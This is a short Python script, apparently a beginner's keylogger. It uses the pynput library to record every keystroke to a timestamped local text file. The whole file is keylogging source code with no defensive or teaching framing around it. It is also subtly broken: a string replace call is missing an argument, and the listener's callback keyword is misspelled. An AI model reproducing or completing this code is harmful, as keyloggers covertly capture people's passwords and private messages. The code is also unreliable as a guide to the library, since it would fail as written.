import datetime
from os import write
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-_%H-%M-%S') 
f = open('keylog{}.txt'.format(d), 'w' )

def key_recorder (key):
    key = str(key)

    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ') 
    elif key == 'Key.backspace':
        f.write('borrar')    
    else:
        f.write(key.replace("'")) 
with Listener(onpress=key_recorder) as l:
    l.join()
    